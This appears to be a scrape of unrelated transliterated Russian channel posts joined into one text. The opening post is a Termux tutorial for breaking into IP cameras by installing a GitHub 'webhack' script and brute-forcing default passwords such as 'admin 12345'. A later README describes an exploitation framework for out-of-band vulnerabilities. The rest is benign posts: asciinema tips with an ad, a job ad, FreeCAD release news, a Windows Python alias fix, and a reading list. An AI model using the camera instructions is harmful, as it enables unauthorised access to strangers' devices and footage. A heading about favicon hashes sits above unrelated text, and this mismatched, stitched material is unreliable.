Vzlom kamery cherez Termux  Vsem khai! Segodnia ia vam pokazhu odin iz  sposobov bruta ip kamer dlia ikh vzloma cherez standartnye paroli. Pognali k ustanovke!  Snachala nuzhno obnovit' vse pakety:  apt update apt upgrade Teper' ustanovim python3:  apt install python Kachaem git:  apt install git Ostalos' klonirovat' repozitorii so skriptom:  git clone https://github.com/yan4ikyt/webhack Posle okonchaniia skachivaniia nuzhno otkryt' papku:  cd webhack Ostalos' delo za malym! Zapuskaem ustanovshchik:  chmod +x install.sh ./install.sh Ostalos' zapustit' sam skript:  python WebHack.py  Vzlom kamer v termux Nuzhno vybrat' stranu dlia bruta kamer, i vy uvidite ikh ip.  Chtoby podkliuchitsia k kamere s telefona vybiraite s okonchaniem :80 :443 :8080  K takim kameram mozhno podkliuchitsia cherez brauzer.  Teper' prosto brutite parol' po osnovnoi baze, to est' admin 12345, admin12345, administrator i t.d.  ========================================  Informatsiia predostavlena iskliuchitel'no v oznakomitel'nykh tseliakh! Avtor ne neset otvetstvennosti za chuzhie deistviia!
Nakhodim poddomeny saita s pomoshch'iu khesha znachka

My videli mnogo priiatnykh dlia glaz shtuk, uluchshaiushchikh opyt v vashei konsoli Linux, i zdes' my reshili ozhivit' nash terminal s pomoshch'iu Lolcat i Chafa, chtoby sdelat' ego zhivopisnee. Koroche, vzglianite na Ascimema, registrator terminala, kotoryi proizvodit tak nazyvaemye ASCII-kasty. Vy mozhete zapisyvat' vse operatsii v terminale v vide spetsial'nogo skripta, a zatem vosproizvodit' ego ili dazhe zagruzhat' na ekzempliar Asciinema-servera i nabliudat' za vosproizvedeniem v web-brauzere Utilita imeet bol'shoi potentsial dlia sistem obrazovaniia, obmena urokami i uchebnymi posobiiami. Pri etom ispol'zovat' dannyi programmnyi instrument tak zhe prosto, kak k primeru, priobresti vysokoklassnye roboty pylesosy v magazine robot-store.com.ua.  Ustanovite ego kak modul' Python3, ispol'zuia:  $ sudo pip3 install asciinema  Vy mozhete sozdat' unikal'nuiu web-ssylku na stranitsu s vashim ASCII-kastom Instrument prinimaet prostye argumenty, takie kak rec [zapis'], play [vosproizvedenie] ili upload [vygruzka], imia <<kasta>> (*.cast), a takzhe dopolnitel'nye optsii, vliiaiushchie na takie aspekty, kak skorost' vosproizvedeniia Vot, naprimer, tipichnaia komanda proigryvaniia s dvoinoi skorost'iu: $ asciinema play -s 2 name.cast..

Budet pliusom: *Opyt raboty s Celery; *Opyt raboty s DRF; *Znanie patternov razrabotki i printsipov OOP; *Opyt razrabotki veb-parserov.   My predlagaem: *Rabotu v komfortnom sovremennom ofise v Moskve/ Krasnodare ili udalenka; *Vsegda svoevremennuiu vyplatu ZP; *Gramotnuiu postanovku zadach i adekvatnoe rukovodstvo; *Korporativnoe obuchenie, kompensatsiia kursov / treningov; *Vozmozhnost' realizatsii sobstvennykh idei; *Sovremennoe oborudovanie; *Kompensatsiia obedov; *Gibkoe nachalo rabochego dnia; *Korporativnyi otdykh =)   Kontakty: [id6185759|@Kate_Guseva] ili g.e@brl.ru

Iskhodnye teksty vypuska byli opublikovany eshchio 26 fevralia, a zatem obnovleny 12 marta, no  ofitsial'noe ob'iavlenie reliza bylo zaderzhano iz-za negotovnosti ustanovochnykh paketov dlia vsekh zaiavlennykh platform. Neskol'ko chasov nazad preduprezhdenie o tom, chto vetka FreeCAD 0.19 eshchio ofitsial'no ne gotova i nakhoditsia v razrabotke ubrana i reliz teper' mozhno schitat' sostoiavshimsia. Aktual'naia versiia na saite takzhe izmenena s 0.18 na 0.19.1.

O psevdonimakh magazinnykh prilozhenii    Uchastnik chata Nika ustanovil Python, vypolnil v komandnoi stroke python i otlozhil kirpichnuiu kladku     Potomu chto u nego otkrylsia magazin! Buduchi chelovekom opytnym, on srazu ponial, chto delo v psevdonimakh zapuska magazinnykh prilozhenii. A tak-to mozhno i mozg slomat' ;)    i Psevdonimy zavezli v #Windows10 1709, chtoby magazinnye prilozheniia mozhno bylo zapuskat' iz komandnoi stroki. I eto otlichno!    Odnako spustia poltora goda u Microsoft sluchilos' pomutnenie rassudka (https://devblogs.microsoft.com/python/python-in-the-windows-10-may-2019-update/) na pochve liubvi k Python   Pytaias' pomoch' nachinaiushchim razrabotchikam v ikh nelegkom vybore, otkuda by skachat' ustanovshchik, Microsoft sdelala khod... pitonom. Na python.exe i python3.exe povesili ustanovshchik paketov      Pol'zovatel' vvodit zavetnoe slovo v konsol' ili Pusk  Otkryvaetsia magazin na stranitse Python  Posle ustanovki iz magazina psevdonim obnovliaetsia  PROFIT!!!    Odnako ia ne sluchaino vydelil kursivom sposob ustanovki. Esli Python postavili klassicheskim ustanovshchikom, vyzov ispolniaemogo faila prodolzhaet otkryvat' magazin     Osobenno "obradovalis'" liudi, u kotorykh Python byl ustanovlen v bolee rannikh versiiakh - obnovlenie do 1903 slomalo im rabotavshii do etogo zapusk.    Ia ne dumaiu, chto v Microsoft PMy tupye nastol'ko, chtoby ne uchest' takoi stsenarii. Prosto oni nastol'ko uporotye, chto ne sochli ego sushchestvennym.    Vylechit' eto mozhno dvumia sposobami na vybor ili v sochetanii:    Tochechno - v parametrakh poishchite alias i otkliuchite psevdonimy dlia python.exe i python3.exe     Global'no - v pol'zovatel'skoi peremennoi PATH peremestite v konets spiska stroku %USERPROFILE%\AppData\Local\Microsoft\WindowsApps    Poleznaia #klassika bloga V kakikh sluchaiakh pri zapuske programmy ne nado ukazyvat' polnyi put' k nei (https://www.outsidethebox.ms/12669/) dopolnena opisaniem psevdonimov.

A framework for identifying and exploiting out-of-band (OOB) vulnerabilities.  Installation & SetupMole InstallPython >= 3.6  virtualenv -p /usr/bin/python3 venv  source venv/bin/activate  ./venv/bin/pip3 install -r requirements.txt  git submodule update --init --recursive  Set an API key in config.yml (must be the same for the client and server)  DNS ConfigurationYou'll need to configure the DNS records in your registrar to point to your mole server. Minimally, you'll need an A record for the name server and an NS record configured.  Mole can be configured to host other configuration options.  Mailgun (Optional)Mailgun requires DNS entries to enable the service: https://help.mailgun.com/hc/en-us/articles/203637190-How-Do-I-Add-or-Delete-a-Domain-  TLSCurrently Mole does not support TLS natively. To implement TLS, use a reverse proxy such as nginx to terminate the TLS connection and forward traffic to the Mole server.  Burp Suite ExtensionThe Burp Suite Extension requires a separate Python 2... #burpextensions #burpsuite #burpsuiteextension #mole #oob #xxe

Ura-ura! Poleznye posty vozvrashchaiutsia v lentu. Python Developer iTechArt, Iura Gogin, pomog otyskat' i sistematizirovat' knigi, saity i drugie resursy, otkuda nachinaiushchie i prodolzhaiushchie razrabotchiki mogut pocherpnut' mnogo interesnogo. Podrobnosti -- nizhe.      Dlia novichkov:    * Flask Framework Cookbook -- Second Edition / Shalabh Aggarwal  Pozvoliaet poluchit' znaniia, neobkhodimye dlia uverennogo napisaniia Flask-prilozhenii i ikh masshtabirovaniia s ispol'zovaniem standartnykh otraslevykh praktik.    * Django 3 By Example: Build powerful and reliable Python web applications from scratch  Pomogaet razobrat'sia s drugim freimvorkom Python, Django 3. V knige na primerakh pokazano, kak sozdavat' s nulia veb-prilozheniia, ispol'zuia luchshie metodiki kodinga na Python.    * learnpythonthehardway.org/python3/  Chastichno platnyi, ochen' podrobnyi poshagovyi onlain-tutorial dlia nachinaiushchikh Python Developers.      Dlia prodvinutykh:    * Programming Features 1st Edition / Caleb Hattingh  Kniga pro asinkhronnost' v Python, kotoraia pomozhet poluchit' bazovye znaniia o stroitel'nykh blokakh asyncio. Dostatochno, chtoby nachat' pisat' event-based programmy!    * CPython Internals: Your Guide to the Python 3 Interpreter / Anthony Shaw  Kniga, poiasniaiushchaia, kak ustroen CPython. Vse o kontseptsiiakh, ideiakh i tonkostiakh raboty s samym rasprostranennym interpretatorom iazyka.    * realpython.com  Sait s bol'shoi bazoi besplatnykh -- i chastichno platnykh -- tutorialov po rabote s Python.    * github.com/vinta/awesome-python  Spisok potriasaiushchikh freimvorkov, bibliotek, programmnogo obespecheniia i resursov Python. Vse samoe luchshee v odnom meste!    * medium.com  Platforma sotsial'noi zhurnalistiki, gde pol'zovateli so vsego mira deliatsia svoimi mneniiami, razrabotkami i resheniiami. Mnogo poleznykh materialov ot Python Specialists! 2 stat'i v den' mozhno prochest' besplatno, bol'she -- po podpiske na istochnik.   Napominaem: Python Developers, priglashaem prisoedinit'sia k nashei komande  Klienty -- startapy i <<iunikorny>> so vsego mira, proekty v domennykh oblastiakh FinTech, PropTech, AdTech, HealthTech i e-commerce.   Predlozheniia v Minske, Vitebske, Gomele, Mogileve i Grodno. Podrobnosti -- na saite: bit.ly/3lquwT0  #itechart #werehiring #itknowledge #iteducation #students #learning #python #pythonprogramming #pythonlearning #minsk
